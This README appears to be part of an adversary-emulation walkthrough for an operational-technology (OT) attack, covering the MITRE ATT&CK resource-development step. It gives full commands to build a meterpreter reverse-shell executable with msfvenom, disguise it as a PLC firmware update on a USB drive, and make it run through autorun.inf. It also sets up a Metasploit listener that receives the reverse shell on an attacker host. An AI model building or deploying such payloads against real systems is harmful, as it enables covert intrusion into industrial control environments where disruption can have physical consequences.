# Resource Development

In this phase, the attacker develops a malicious program to be delivered via a USB thumb drive. The USB will be disguised as a legitimate firmware update for the target OT system, obtained through the information gathered during the **Reconnaissance** phase.

- **MITRE ATT&CK Technique**: [T1587.001 - Develop Capabilities: Malware](https://attack.mitre.org/techniques/T1587/001/)

## Objective

The goal is to craft a malicious executable that will run automatically when inserted into the target OT system, allowing the attacker to gain control or disrupt operations.

## Steps to Execute Resource Development

### 1. Create a Malicious Payload Using `msfvenom`

The malicious program can be generated using **Metasploit**’s `msfvenom` tool. This payload will be disguised as a firmware update and executed when inserted into the OT system.

#### Command to Generate a Payload:

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.115 LPORT=4444 -f exe -o firmware_update.exe
```

- LHOST: IP address of the attacker's machine where the reverse shell will connect.
- LPORT: Port to listen for the reverse shell connection.
- -f exe: Specifies the format of the output file as a Windows executable.
- firmware_update.exe: The name of the malicious file disguised as a firmware update.


### 2. Load the Payload onto a USB Thumb Drive
Once the malicious executable is created, it needs to be placed on a USB thumb drive:

- Insert the USB drive into the attacker's machine

- Copy the malicious payload onto the drive:
```
cp firmware_update.exe /media/usb-drive/
```
- Rename the file to something that looks legitimate, such as:
```
mv /media/usb-drive/firmware_update.exe /media/usb-drive/PLC_Firmware_Update.exe
```

### 3. Configure Autorun (Optional)
For systems that still support autorun (e.g., legacy Windows-based OT workstations), you can create an autorun.inf file to automatically execute the malicious file when the USB drive is inserted:

- Create an autorun.inf file on the USB drive:
```
echo "[autorun]" > /media/usb-drive/autorun.inf
echo "open=PLC_Firmware_Update.exe" >> /media/usb-drive/autorun.inf
```
- Save and safely eject the USB drive.

### 4. Test the Malicious Payload
Test the payload to ensure it works as expected by running the PLC_Firmware_Update.exe on a virtual machine or test system. You can listen for the reverse shell on the attacker's machine using Metasploit:

#### Set up a Metasploit Listener:
```
msfconsole
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.0.115
set LPORT 4444
exploit
```
When the payload is executed, the attacker will gain a reverse shell into the system.

## Next Steps
Once the malicious USB drive is prepared, it will be delivered to the target via social engineering in the Initial Access phase.

## Summary
In the Resource Development (T1587.001) phase, the attacker creates a malicious program that will be loaded onto a USB thumb drive, disguised as a legitimate firmware update. This payload is designed to provide the attacker with access to the OT system when inserted and executed by the target.


```
This `README.md` outlines how the attacker prepares the malicious payload and USB drive during the **Resource Development** phase of the attack.
```
